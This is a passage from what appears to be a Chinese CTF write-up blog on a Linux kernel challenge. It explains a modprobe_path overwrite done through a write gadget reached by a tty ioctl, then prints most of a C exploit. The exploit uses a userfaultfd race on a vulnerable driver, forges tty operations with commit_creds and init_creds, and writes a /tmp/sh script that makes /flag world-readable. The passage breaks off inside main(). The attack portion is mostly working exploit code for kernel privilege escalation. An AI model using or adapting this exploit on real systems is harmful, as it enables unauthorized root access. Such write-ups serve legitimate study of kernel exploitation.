id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>å¥½ï¼Œæˆ‘è¿™ä¸ªäººæ¯”è¾ƒæ‡’ï¼Œä¸æƒ³è¿›è¡Œä¸¤æ¬¡æ ˆè¿ç§»ï¼Œè€Œä¸”ç°åœ¨å‡è®¾è¿™é“é¢˜ç›®çš„ pt_regs å¼€å¯äº†éšæœºåŒ–(CONFIG_RANDOMIZE_KSTACK_OFFSET&#x3D;y)ï¼Œæ¯æ¬¡åœ¨æ ˆä¸Šçš„åç§»éƒ½ä¸ä¸€æ ·ï¼Œè¿™ä¸ªæ—¶å€™å°±æœ‰è¯·æˆ‘ä»¬çš„ <code>modprobe_path</code> ç™»åœºäº†ã€‚åªè¦æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹è¿™ä¸ªåœ°æ–¹çš„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå˜å‘çš„å°† <code>flag</code> çš„æƒé™æå‡åˆ°æ™®é€šéƒ½å¯ä»¥è¯»å–ï¼Œé‚£æˆ‘ä»¬è¦å¦‚ä½•ä¿®æ”¹è¿™ä¸ªåœ°æ–¹çš„å€¼å‘¢ï¼Ÿæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¾ˆå¥½ç”¨çš„ <code>gadget</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffff810f69f1</span>: mov qword ptr [rdx + <span class="number">8</span>], rsi; ret;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬æ‰§è¡Œ <code>iotcl(tty_fd, var1, var2)</code> çš„æ—¶å€™ï¼Œ<code>rdx</code> å’Œ <code>rsi</code> æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ã€Šç±»ä¼¼äºã€‹ <code>ioctl(tty_fd, &quot;/tmp/sh&quot;, modprobe_path - 8);</code> æ¥å®ç°å¯¹ <code>modprobe_path</code> çš„ä¿®æ”¹</p><img src="/2024/10/07/kno_puts/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç”±äº <code>ioctl</code> çš„ <code>rsi</code> ä¼ è¿›å»çš„æœ€ç»ˆåªæœ‰å››å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ†æ®µä¼ ä¸¤æ¬¡</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> fake_ops_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff817d1e76</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"><span class="type">size_t</span> magic_gadget = <span class="number">0xffffffff810f69f1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = kernel_base + <span class="number">0x13e8030</span> - <span class="number">0x60</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = fake_ops_addr + <span class="number">0x40</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        uffd_buf[<span class="number">5</span>] = init_creds;</span><br><span class="line">        uffd_buf[<span class="number">7</span>] = magic_gadget;</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[5]&quot;</span>, uffd_buf[<span class="number">5</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is: %s\n&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span 